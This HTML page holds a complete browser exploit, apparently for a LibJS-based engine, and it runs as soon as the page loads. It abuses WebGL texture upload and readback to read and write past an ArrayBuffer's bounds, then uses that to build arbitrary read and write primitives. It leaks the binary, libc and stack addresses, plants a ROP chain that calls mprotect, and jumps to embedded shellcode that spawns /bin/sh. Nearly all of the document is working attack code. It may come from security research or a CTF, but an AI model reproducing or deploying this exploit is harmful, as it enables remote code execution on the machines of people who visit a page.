<!doctype html>
<canvas id=cnv width=1000 height=1000></canvas>
<script>

// Generated with shellcode.py - just pops a shell
const shellcode_bytes = new Uint8Array([0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x1,0x1,0x81,0x34,0x24,0x1,0x1,0x1,0x1,0x31,0xf6,0x56,0x6a,0x8,0x5e,0x48,0x1,0xe6,0x56,0x48,0x89,0xe6,0x31,0xd2,0x6a,0x3b,0x58,0xf,0x5]);

// Default ROP gadgets - used to fill registers
const pop_rdi_o  = 0x00000000005758c4n // : pop rdi ; ret
const pop_rsi_o  = 0x00000000005756d5n // : pop rsi ; ret
const pop_rdx_o  = 0x000000000057c279n // : pop rdx ; ret
// mprotect PLT - used to get RWX page
const mprotect_o = 0x05747F0n

// Offset of leaked binary address - vtable of ArrayBuffer
const binary_leak_o    = 0x6d44000n + 0x1c7150n;
// Offset of read function in libc
const libc_leak_o      = 0xf8250n;
// Offset of read GOT entry in binary
const read_got_o       = 0x6FF6688n;
// Offset of environ in libc
const environ_o        = 0x1da320n;
// Offset of target ROP location from leaked stack address (environ)
const ret_o            = 0x1060n;
// Offset of vtable location from the begging of ArrayBuffer with OOB
const ab_vtable_o      = 0x58
// Offset of pointer localtion from the begging of ArrayBuffer with OOB
const victim_pointer_o = 0xa0

// Secret debugging technique
function sleep(s) {
  const ms = 1000 * s
  const start = Date.now();
  while (Date.now() - start < ms) {}
}

// Unpack 8-byte BigInt from bytes
function unpack(bytes, offset = 0)
{
  let n = 0n;
  for (let i = 7; i >= 0; --i) {
    n = (n << 8n) | BigInt(bytes[offset + i]);
  }
  return n;
}

// Pack 8-byte BigInt to bytes
function pack(value, out = new Uint8Array(8), offset = 0)
{
  let v = value;
  for (let i = 0; i < 8; ++i) {
    out[offset + i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

// Write any 64-bit values to console in convenient format
function loghex(num)
{
  console.log('0x'+num.toString(16))
}

function exploit()
{
  console.log('exploit');

  // Build OOB primitives using vulnerabilities and WebGL logic

  const gl     = cnv.getContext("webgl2");
  const tex    = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, tex);

  // One OOB function
  // It represents simetry of exploited vulnerabilities
  function oob(src, dest, sz)
  {
    const pw = sz;
    const ph = 1;

    gl.texImage2D(
      gl.TEXTURE_2D,
      0,
      gl.RGBA,
      pw,
      ph,
      0,
      gl.RGBA,
      gl.UNSIGNED_BYTE,
      src
    );

    const fbo = gl.createFramebuffer();
    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0,
                            gl.TEXTURE_2D, tex, 0);

    gl.readPixels(0, 0, pw, ph, gl.RGBA, gl.UNSIGNED_BYTE, dest);
  }

  // Write src to victim ignoring its size
  function oob_write(victim, src)
  {
    oob(src, victim, src.length);
  }

  // Read dest from victim ignoring its size
  function oob_read(victim, dest)
  {
    oob(victim, dest, dest.length);
  }

  // Buffer to store data for readig/writing
  let buffer     = new Uint8Array(0xa8);
  // trampoline buffer we will use for OOB access
  // NOTE: It is small to force LibJS to use some 
  //       "Objects" storage for it instead of normal heap.
  //       With small size sensitive data of victim_ab will 
  //       be stored right after the trampoline's ArrayBuffer.
  let trampoline = new Uint8Array(0x20).fill(0x77);
  // ArrayBuffer we will corrupt
  let victim_ab  = new ArrayBuffer(0x300);
  let victim     = new Uint8Array(victim_ab);
  // We use victim's ArrayBuffer to save shellcode since we'll leak its address later
  victim.set(shellcode_bytes, 0x00);

  // 8-byte arbitrary read primitive based on writing arbitrary address in place of victim's pointer 
  function readq(address)
  {
    oob_read(trampoline, buffer);
    buffer.set(pack(address), victim_pointer_o);
    oob_write(trampoline, buffer);
    return unpack(victim.slice(0x00, 0x08));
  }

  // 8-byte arbitrary write primitive similar to read
  function writeq(address, value)
  {
    oob_read(trampoline, buffer);
    buffer.set(pack(address), victim_pointer_o);
    oob_write(trampoline, buffer);
    victim.set(pack(value), 0x00);
  }

  // Just one OOB read to leak addresses
  oob_read(trampoline, buffer);

  // Leak of binary base
  const binary        = unpack(buffer.slice(ab_vtable_o, ab_vtable_o+0x08)) - binary_leak_o;
  loghex(binary);
  // Leak heap address of shellcode
  const victim_ab_buf = unpack(buffer.slice(victim_pointer_o, victim_pointer_o+0x08));
  loghex(victim_ab_buf);

  // Address of read GOT entry
  const read_got = binary + read_got_o;
  loghex(read_got);
  // Leak libc from read GOT entry
  const libc = readq(read_got) - libc_leak_o;
  loghex(libc);
  // Leak stack from libc's environ
  const stack = readq(libc + environ_o);
  loghex(stack);

  // Compute target address for ROP - somewhere before JS script execution in call stack
  const ret   = stack - ret_o;
  let   ropsz = 0x00n;

  // Add 8-byte to ROP
  function p(q)
  {
    writeq(ret + ropsz, q);
    ropsz += 0x08n;
  }

  // ROP
  p(binary + pop_rdi_o);        // rdi -> page of shellcode
  p(victim_ab_buf & (~0xFFFn));
  p(binary + pop_rsi_o);        // rsi -> 0x1000 (size of page)
  p(0x1000n);
  p(binary + pop_rdx_o);        // rdx -> 0b111 (RWX permissions)
  p(0x07n);
  p(binary + mprotect_o);       // call mprotect
  p(victim_ab_buf);             // jump to shellcode

  // finish JS script execution to run shellcode
}

exploit()

</script>
